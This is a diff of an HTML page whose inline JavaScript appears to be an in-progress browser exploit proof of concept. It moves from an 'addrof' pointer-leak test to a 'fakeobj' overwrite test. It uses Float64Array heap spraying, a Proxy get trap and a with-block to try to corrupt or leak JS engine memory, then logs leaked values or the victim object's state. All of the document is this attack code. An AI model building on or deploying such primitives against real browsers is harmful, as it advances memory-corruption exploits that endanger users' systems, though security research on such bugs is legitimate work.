@@ -1,38 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ProxyObject addrof() Detection v2</title>
+    <title>FakeObj Detection PoC</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting ProxyObject pointer leak test...");
+            log("Starting fakeobj detection test...");
 
-            // Object we want to find the address of
-            const victim = { secret: "flag{exploit_dev_in_progress}" };
+            // Victim object we want to overwrite
+            let victim = { val: 13.37 };
 
-            // Spray Float64Arrays to increase chance of overlap
-            const sprayCount = 1000;
+            // Heap spray to increase odds of adjacency
+            const sprayCount = 2000;
             let spray = [];
             for (let i = 0; i < sprayCount; i++) {
                 spray.push(new Float64Array(4));
             }
 
-            // Add one special array we'll inspect manually
-            const probe = new Float64Array(10);
-            spray.push(probe);
+            // Add victim near sprayed arrays
+            spray.push(victim);
+            spray.push(new Float64Array(10));
 
+            // Trigger Proxy + with-block to touch internal scopes
             let callCount = 0;
 
             const handler = {
                 get(target, prop, receiver) {
-                    if (callCount++ > 5) {
-                        log("Breaking recursion after 5 calls");
-                        return undefined;
-                    }
-
+                    if (callCount++ > 5) return undefined;
                     log("Proxy 'get' called (" + callCount + ")");
                     log("prop = " + prop);
 
@@ -56,32 +53,26 @@
 
             const proxy = new Proxy(victim, handler);
 
-            // Run inside with-block to trigger JSScope behavior
             (function () {
                 with (proxy) {
                     try {
-                        // Access any property to trigger Proxy trap
                         log("Accessing 'toString'...");
-                        toString(); // Could be any property access
+                        toString();
                     } catch (e) {
                         log("Exception in with-block: " + e.message);
                     }
                 }
             })();
 
-            // After exploit, scan probe array for leaked pointers
-            log("Scanning probe buffer for leaked values:");
-            for (let i = 0; i < probe.length; i++) {
-                let val = probe[i];
-                if (val !== 0 && !isNaN(val)) {
-                    log(`probe[${i}] = ${val} (0x${val.toString(16)})`);
-                }
-            }
+            // Check if victim object was overwritten
+            log("Victim after: " + JSON.stringify(victim));
+            log("Victim.val = " + victim.val);
+            log("Victim.toString = " + victim.toString);
         };
     </script>
 </head>
 <body>
-    <h2>ProxyObject Pointer Leak Test v2</h2>
-    <p>Detecting potential leaked pointers using TypedArray heap spraying.</p>
+    <h2>FakeObj Detection Test</h2>
+    <p>Trying to detect heap overwrites or metadata corruption.</p>
 </body>
 </html>
